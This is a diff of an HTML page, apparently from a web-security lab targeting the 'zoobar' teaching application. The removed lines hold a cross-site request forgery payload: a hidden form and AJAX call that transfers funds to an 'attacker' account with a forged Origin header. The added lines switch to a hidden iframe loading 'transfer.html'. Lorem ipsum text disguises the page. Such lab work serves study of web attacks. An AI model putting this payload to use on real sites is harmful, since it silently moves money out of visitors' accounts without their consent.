@@ -5,27 +5,12 @@
   <script src="http://zoobar.org:5000/jquery.min.js" type="text/javascript" charset="utf-8"></script>
 </head>
 <body>
-  <form action="http://zoobar.org:5000/transfer" method="post" accept-charset="utf-8" id="stealer">
-    <input type="hidden" name="name" value="attacker">
-    <input type="hidden" name="amount" value="5">
-  </form>
+  <iframe src="transfer.html" id="framer" style="display: none;"></iframe>
   <script type="text/javascript" charset="utf-8">
-  $(document).ready(function() {
-    var stealer = document.getElementById('stealer');
-    $.ajax({
-      data: {
-        name: stealer.name.value,
-        amount: stealer.amount.value,
-        crossDomain: true
-      },
-      headers: {
-        'Origin': 'http://zoobar.org:5000/'
-      },
-      type: 'POST',
-      url: stealer.action
-    }); // doesn't work on chrome :'(
-    // stealer.submit();
-  });
+  // var framer = document.getElementById('framer');
+  // $(framer).load(function() {
+  //   framer.src = "transfer.html";
+  // });
   </script>
   <div>
     Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce at magna eget risus elementum rutrum. Praesent risus nisl, vestibulum non sodales eu, pretium ac arcu. Suspendisse vitae auctor nisl. Nullam quis ipsum massa. Morbi quis tellus vel orci consequat mattis eget sed nulla. In dictum consectetur risus a tincidunt. Donec at purus metus, vitae pharetra elit. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vestibulum in neque ac elit dapibus ultrices quis quis turpis. In faucibus enim tortor. Aliquam vitae urna non felis venenatis laoreet eget eget dui. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Etiam at metus lobortis elit lacinia pharetra in eget diam. Sed vitae posuere tellus. Integer tincidunt, justo in lacinia bibendum, ante nisi dictum dui, nec suscipit lorem mi sit amet dui.
